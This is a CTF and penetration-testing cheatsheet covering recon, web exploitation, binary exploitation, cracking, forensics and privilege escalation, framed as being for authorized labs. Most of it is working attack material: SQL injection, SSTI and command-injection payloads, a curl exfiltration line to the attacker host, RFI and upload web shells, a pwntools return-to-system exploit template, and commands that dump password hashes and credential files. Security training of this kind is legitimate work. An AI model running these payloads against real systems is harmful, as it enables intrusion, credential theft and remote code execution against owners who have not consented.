# CTF Master Cheatsheet

> For authorized CTF / educational use only (Hack The Box, picoCTF, your own lab).
> Run these only against machines you have explicit permission to test.

Placeholder convention used throughout:
- `$IP` / `TARGET` = target IP or hostname
- `$LHOST` = your attacker IP, `$LPORT` = your listening port
- `$URL` = full target URL, `$DOMAIN` = target domain
- Wordlists assume SecLists at `/usr/share/seclists` (`apt install seclists` or clone `danielmiessler/SecLists`).

---

## 0. Quick Start Workflow

```bash
# 1. Set target as env var so you can copy/paste fast
export IP=10.10.10.10
export LHOST=10.10.14.5

# 2. Fast port sweep, then targeted version scan (see nmap section)
rustscan -a $IP -- -sCV -oA scans/nmap

# 3. Drop everything in a working dir
mkdir -p loot scans exploits && cd $_
```

---

## 1. Recon / Enumeration

### nmap (see nmap-cheatsheet.md for full detail)
```bash
nmap -sC -sV -oA scans/initial $IP            # default scripts + versions
nmap -p- --min-rate 5000 -oA scans/allports $IP   # all 65535 ports fast
nmap -p- -sV -sC -oA scans/full $IP           # full + scripts (slow, thorough)
nmap -sU --top-ports 100 $IP                  # top UDP ports
nmap --script vuln $IP                         # vuln NSE scripts
```

### rustscan (fast port discovery, pipes into nmap)
```bash
rustscan -a $IP                                # quick all-port scan
rustscan -a $IP -- -sCV -oA scans/rust         # then run nmap -sCV on found ports
rustscan -a $IP --range 1-65535 --ulimit 5000  # full range, raise file limit
rustscan -a $IP -p 80,443,8080                 # specific ports
```

### Directory / content brute force
```bash
# gobuster
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt,html
gobuster dir -u http://$IP -w <wordlist> -b 404,403 -k    # -k skip TLS verify, -b blacklist codes

# ffuf (FUZZ keyword marks injection point)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$IP/FUZZ
ffuf -u http://$IP/FUZZ -w <wl> -e .php,.txt,.html -mc 200,301,302,403   # extensions + match codes
ffuf -u http://$IP/FUZZ -w <wl> -fc 404 -fs 0            # filter out 404 / size 0
ffuf -u http://$IP/FUZZ -w <wl> -recursion -recursion-depth 2

# feroxbuster (recursive by default, written in Rust)
feroxbuster -u http://$IP
feroxbuster -u http://$IP -x php,txt,html -t 50 -d 3      # extensions, threads, depth
feroxbuster -u http://$IP -w <wl> -s 200,301,302 -C 404   # status filters
feroxbuster -u http://$IP --redirects -k                  # follow redirects, ignore TLS err
```

### Virtual host (vhost) fuzzing — fuzz the Host header
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ \
     -u http://$IP/ -H "Host: FUZZ.$DOMAIN" -fs <baseline_size>
gobuster vhost -u http://$DOMAIN -w <wordlist> --append-domain
```

### Subdomain enumeration (DNS)
```bash
ffuf -w <subdomain_wl>:FUZZ -u http://FUZZ.$DOMAIN/ -mc 200,301,302
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# Passive
subfinder -d $DOMAIN -silent
amass enum -passive -d $DOMAIN
```

### Web fingerprinting
```bash
whatweb http://$IP
whatweb -v -a 3 http://$IP                      # aggressive
nikto -h http://$IP -o scans/nikto.txt          # web vuln scanner
nikto -h http://$IP -ssl -p 443
curl -sI http://$IP                              # headers only
curl -s http://$IP -A "Mozilla/5.0"             # set user-agent
wappalyzer / browser dev tools for client-side stack
```

### Local hosts file (needed for vhosts you discover)
```bash
echo "$IP $DOMAIN admin.$DOMAIN" | sudo tee -a /etc/hosts
```

---

## 2. Service Enumeration (SMB / NFS / FTP / SSH / others)

### SMB (139/445)
```bash
smbclient -L //$IP/ -N                          # list shares, null session
smbclient //$IP/share -N                        # connect to a share anonymously
smbmap -H $IP                                    # show shares + permissions
smbmap -H $IP -u guest -p ""                     # guest creds
enum4linux-ng -A $IP                             # all-in-one enumeration
nmap --script "smb-enum-*,smb-vuln-*" -p139,445 $IP
crackmapexec smb $IP                             # OS / domain info
crackmapexec smb $IP -u user -p pass --shares    # auth + list shares
rpcclient -U "" -N $IP                            # then: enumdomusers, querydispinfo
# get a file: smbclient //$IP/share -N -c 'get flag.txt'
```

### NFS (2049)
```bash
showmount -e $IP                                 # list exports
mkdir /mnt/nfs && sudo mount -t nfs $IP:/export /mnt/nfs -o nolock
# no_root_squash exports -> potential privesc by planting SUID binaries
```

### FTP (21)
```bash
ftp $IP                                          # try anonymous / anonymous
nmap --script "ftp-anon,ftp-vsftpd-backdoor" -p21 $IP
wget -m --no-passive ftp://anonymous:anonymous@$IP   # mirror everything
# In ftp: binary; passive; get file; put file
curl -u anonymous:anonymous ftp://$IP/ --list-only
```

### SSH (22)
```bash
ssh user@$IP                                     # banner often leaks version/OS
nc $IP 22                                          # grab banner
ssh -i id_rsa user@$IP                            # key auth (chmod 600 id_rsa first)
# Crack a passphrase-protected key:
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
# Bruteforce (lab only):
hydra -L users.txt -P rockyou.txt ssh://$IP -t 4
```

### Other quick hits
```bash
# SNMP (161/udp)
snmpwalk -v2c -c public $IP
onesixtyone -c community.txt $IP
# LDAP (389)
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
# Redis (6379)
redis-cli -h $IP        # then: INFO, KEYS *, CONFIG GET dir
# MySQL / MSSQL
mysql -h $IP -u root -p
impacket-mssqlclient user:pass@$IP -windows-auth
# RDP
xfreerdp /v:$IP /u:user /p:pass +clipboard
```

---

## 3. Web Exploitation

### LFI / RFI
```bash
http://$IP/page.php?file=../../../../etc/passwd
http://$IP/page.php?file=....//....//etc/passwd            # double-dot bypass
http://$IP/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://$IP/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
http://$IP/page.php?file=http://$LHOST/shell.php             # RFI if allow_url_include=On
# Null byte (old PHP): ?file=../../etc/passwd%00
# LFI->RFI->RCE: poison /var/log/apache2/access.log via User-Agent, then include the log
```
See common-payloads.md for full LFI-to-RCE chains and wrappers.

### SQL injection (manual)
```sql
-- Detect
' OR '1'='1            "  OR 1=1-- -      ')-- -      admin'-- -
-- Determine columns
' ORDER BY 1-- -   (increment until error)
' UNION SELECT 1,2,3-- -
-- Enumerate (MySQL)
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3 FROM users-- -
-- Read file (MySQL, FILE priv): ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
```

### sqlmap (automated)
```bash
sqlmap -u "http://$IP/page.php?id=1" --batch --dbs
sqlmap -u "http://$IP/page.php?id=1" -D dbname --tables
sqlmap -u "http://$IP/page.php?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3       # saved Burp request
sqlmap -u "$URL" --data "user=a&pass=b" -p user        # POST, target param
sqlmap -u "$URL" --cookie="PHPSESSID=..." --os-shell   # try OS shell
sqlmap -u "$URL" --batch --tamper=space2comment         # WAF bypass tamper
```

### SSTI (Server-Side Template Injection)
```
# Detection (polyglot): ${{<%[%'"}}%\.
# Math test:  {{7*7}}  -> 49 (Jinja2/Twig)   ${7*7}  (Freemarker/Java)   #{7*7} (Ruby)
# {{7*'7'}} -> 7777777 (Jinja2)  |  49 (Twig)
# Jinja2 RCE:
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # find os.popen subclass index
# Twig RCE: {{['id']|filter('system')}}
# Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
```
Full per-engine payloads in common-payloads.md.

### Command injection
```bash
; id        | id        || id        & id        && id        `id`        $(id)
%0a id      # newline    | "; id; "   | use ${IFS} when spaces are filtered
# Blind: && curl http://$LHOST/$(id|base64)   or  ; ping -c1 $LHOST
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
<!-- PHP wrapper for non-text files -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### SSRF + cloud metadata
```
http://$IP/?url=http://169.254.169.254/latest/meta-data/        # AWS IMDSv1
http://$IP/?url=http://169.254.169.254/computeMetadata/v1/       # GCP (needs Metadata-Flavor: Google)
http://$IP/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
# Bypass filters: http://127.0.0.1, http://[::], http://0177.0.0.1, http://2130706433
```

### File upload bypass
```
shell.php.jpg     shell.pHp     shell.phtml/.php5/.phar
Content-Type: image/jpeg (but body is PHP)
Add magic bytes: GIF89a; <?php system($_GET['c']); ?>
.htaccess trick: AddType application/x-httpd-php .jpg
Double extension / null byte (legacy): shell.php%00.jpg
```

### JWT attacks
```bash
# Decode
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null
# none algorithm: set header {"alg":"none"} and strip signature
# Crack HMAC secret:
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
# alg confusion RS256->HS256: sign with public key as HMAC secret
# Tool: python3 jwt_tool.py $JWT -C -d rockyou.txt
```

---

## 4. Reverse Engineering

```bash
file binary                                      # identify type/arch
strings -n 8 binary | less                       # readable strings (min len 8)
strings -e l binary                              # 16-bit little-endian (Windows wide)
nm binary                                        # symbols
objdump -d -M intel binary | less                # disassembly (Intel syntax)
objdump -s -j .rodata binary                     # dump a section
readelf -a binary                                # ELF headers, sections, symbols
ltrace ./binary ; strace ./binary                # library / syscall trace
```

### radare2 quickstart
```bash
r2 -d ./binary          # open in debug mode
aaa                     # analyze all
afl                     # list functions
pdf @ main              # disassemble main
s sym.main ; VV         # seek + visual graph mode
iz                      # strings in data section
db 0x401234 ; dc        # breakpoint + continue
```

### Ghidra
```
ghidraRun  ->  New Project -> import binary -> double-click -> "Analyze? Yes"
Symbol Tree: jump to main / entry.  Decompiler window (right) gives pseudo-C.
Rename vars (L), retype (Ctrl+L), follow xrefs (Ctrl+Shift+F).
```

### gdb + pwndbg / gef
```bash
gdb ./binary
b *main           # break at address
run / r ; continue / c ; ni ; si           # step
info functions ; info registers
x/20xw $rsp       # examine 20 words at stack ptr
disas main
checksec          # (pwndbg/gef) show protections
pattern create 200 ; pattern offset $rsp   # find offset (gef)
```

---

## 5. Binary Exploitation (pwn)

```bash
checksec --file=./binary          # RELRO, Canary, NX, PIE
# Cyclic pattern to find offset
python3 -c "from pwn import *; print(cyclic(200))"
gdb ./binary -> run < <(python3 -c "from pwn import *; print(cyclic(200))")
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"   # offset from crash value
# Gadgets
ROPgadget --binary ./binary | grep "pop rdi"
ropper --file ./binary --search "pop rdi"
# Format string: %p %p %p to leak stack; %n to write; %7$p to target arg 7
```

### pwntools template
```python
from pwn import *
context.binary = elf = ELF('./binary')
context.log_level = 'debug'
# io = process('./binary')
io = remote('$IP', 1337)
offset = 72
rop = ROP(elf)
payload  = b'A'*offset
payload += p64(rop.find_gadget(['ret'])[0])     # stack align
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.plt['system'])
io.sendline(payload)
io.interactive()
```

---

## 6. Cryptography

### RSA
```bash
# Quick wins with RsaCtfTool (covers many attacks)
python3 RsaCtfTool.py --publickey key.pub --uncipherfile cipher.bin
python3 RsaCtfTool.py -n <N> -e <e> --uncipher <c>
# Factor small/weak N
factordb (http://factordb.com)   |   yafu   |   from sympy import factorint
# openssl key parsing
openssl rsa -pubin -in key.pub -text -noout
```
Common attacks: small e (cube root if no padding), shared/common modulus, Wiener (small d), Fermat (close primes p~q), Hastad broadcast.

### XOR
```python
from pwn import xor
xor(b'ciphertext', b'key')        # repeating-key XOR
# Single-byte: brute all 256 keys, score by english frequency
for k in range(256): print(bytes([c^k for c in data]))
```

### Hash cracking (full modes in section 8)
```bash
hashid '<hash>'           # identify hash type
hash-identifier
john hash.txt --wordlist=rockyou.txt
hashcat -m 0 hash.txt rockyou.txt        # 0 = MD5
```

### CyberChef recipes (https://gchq.github.io/CyberChef)
```
From Base64 -> From Hex -> XOR Brute Force
Magic operation (auto-detects encodings)
ROT13 / ROT47, URL Decode, From Charcode, Vigenere Decode
```

---

## 7. Forensics

```bash
file mystery                                      # always start here
exiftool image.jpg                                # metadata (look for GPS, comments, creator)
binwalk file.bin                                  # detect embedded files
binwalk -e file.bin                               # extract embedded files
foremost -i disk.img -o out/                      # carve files by signature
strings -n 6 file | grep -i flag
xxd file | head                                   # hex view
```

### Steganography
```bash
steghide info file.jpg                            # check for embedded data
steghide extract -sf file.jpg                     # extract (asks passphrase; try empty/rockyou)
stegcracker file.jpg rockyou.txt                  # brute steghide passphrase
zsteg image.png                                   # LSB stego in PNG/BMP
zsteg -a image.png                                # all methods
stegseek file.jpg rockyou.txt                     # fast steghide cracker
# Audio: Audacity (spectrogram view), sonic-visualiser
# Look at color planes: stegsolve.jar
```

### Memory forensics — Volatility 3
```bash
vol -f mem.raw windows.info                       # identify OS/profile (auto in vol3)
vol -f mem.raw windows.pslist                     # processes (EPROCESS list)
vol -f mem.raw windows.pstree                     # process tree
vol -f mem.raw windows.psscan                     # carve hidden/terminated procs
vol -f mem.raw windows.cmdline                    # process command lines
vol -f mem.raw windows.netscan                    # network connections
vol -f mem.raw windows.netstat
vol -f mem.raw windows.filescan                   # files in memory
vol -f mem.raw windows.dumpfiles --virtaddr 0x...  # dump a file
vol -f mem.raw windows.hashdump                   # SAM hashes
vol -f mem.raw windows.lsadump
vol -f mem.raw windows.registry.hivelist
vol -f mem.raw windows.registry.printkey --key "..."
vol -f mem.raw windows.malfind                    # injected code
vol -f mem.raw windows.memmap --pid <pid> --dump
# Linux: vol -f mem.lime linux.pslist / linux.bash (shell history)
```

### Packet capture — tshark / Wireshark
```bash
tshark -r capture.pcap                             # summary
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
tshark -r capture.pcap --export-objects http,out/  # extract transferred files
tshark -r capture.pcap -Y "tcp.stream eq 3" -T fields -e data.text
# Wireshark display filters:
http.request.method == "POST"   |   ftp   |   dns   |   ip.addr == 10.0.0.5
tcp contains "password"         |   Follow > TCP Stream for full convo
# Strings sweep:
strings capture.pcap | grep -i 'pass\|flag\|user'
```

---

## 8. Password Cracking (John & Hashcat)

### Identify and prep
```bash
hashid '<hash>' ; hash-identifier
# Convert files to crackable hashes (john *2john helpers):
zip2john secret.zip > zip.hash
ssh2john id_rsa > ssh.hash
rar2john file.rar > rar.hash
pdf2john file.pdf > pdf.hash
office2john doc.docx > office.hash
keepass2john db.kdbx > kp.hash
```

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john hash.txt --format=raw-md5 --wordlist=rockyou.txt
john hash.txt --show                               # show cracked
john --wordlist=rockyou.txt --rules hash.txt       # mangling rules
john --incremental hash.txt                         # pure brute force
unshadow /etc/passwd /etc/shadow > unshadowed && john unshadowed
```

### Hashcat (attack modes: -a 0 dict, -a 3 mask, -a 6 hybrid)
```bash
hashcat -m <mode> -a 0 hash.txt rockyou.txt
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?d?d'        # mask: ?l lower ?u upper ?d digit ?s special ?a all
hashcat -m 1000 hash.txt rockyou.txt --show
hashcat --example-hashes -m 1000                    # see example hash format
```

### Common hashcat -m modes
| Mode | Type | Mode | Type |
|---|---|---|---|
| 0 | MD5 | 1700 | SHA-512 |
| 100 | SHA1 | 500 | md5crypt ($1$) |
| 1400 | SHA-256 | 1800 | sha512crypt ($6$) |
| 1000 | NTLM | 3200 | bcrypt ($2*$) |
| 1100 | DCC (mscache) | 2100 | DCC2 (mscache2) |
| 5500 | NetNTLMv1 | 5600 | NetNTLMv2 |
| 13100 | Kerberoast (TGS) | 18200 | AS-REP roast |
| 22000 | WPA-PBKDF2 (replaces 2500) | 400 | WordPress/phpass |
| 1500 | descrypt | 16500 | JWT (HMAC) |

---

## 9. Privilege Escalation (quick pointers)

### Linux
```bash
# Automated
./linpeas.sh    |   ./linenum.sh   |   pspy64 (watch cron/processes)
# Manual checklist
id ; sudo -l                       # sudo rights -> check GTFOBins
find / -perm -4000 -type f 2>/dev/null     # SUID binaries -> GTFOBins
getcap -r / 2>/dev/null             # capabilities (cap_setuid etc.)
cat /etc/crontab ; ls -la /etc/cron*       # writable cron scripts
uname -a ; cat /etc/os-release      # kernel exploits (searchsploit)
ss -tlnp                            # internal services (port forward to reach)
cat /home/*/.ssh/id_rsa ; history files ; .bash_history
# Writable /etc/passwd? add root user:  openssl passwd -1 -salt x pass
```
GTFOBins (https://gtfobins.github.io) — abuse SUID/sudo binaries for shell/file read/write.

### Windows
```powershell
whoami /priv                         # SeImpersonate -> PrintSpoofer/JuicyPotato
winPEAS.exe   |   PowerUp.ps1 (Invoke-AllChecks)
# Unquoted service paths, weak service perms, AlwaysInstallElevated, stored creds
reg query HKLM\SYSTEM\CurrentControlSet\Services
cmdkey /list ; type C:\unattend.xml
```
LOLBAS (https://lolbas-project.github.io) — living-off-the-land Windows binaries.

---

## 10. Handy One-Liners

```bash
# Spawn a Python web server to host files
python3 -m http.server 80
# Pull a file to target
wget http://$LHOST/linpeas.sh ; curl http://$LHOST/x -o x
# URL-encode a payload quickly
python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "; id"
# Base64 a file to paste across a shell
base64 -w0 file ; (decode) base64 -d <<< 'BASE64'
```

See: `reverse-shells.md`, `common-payloads.md`, `nmap-cheatsheet.md`, `linux-fluency.md`.
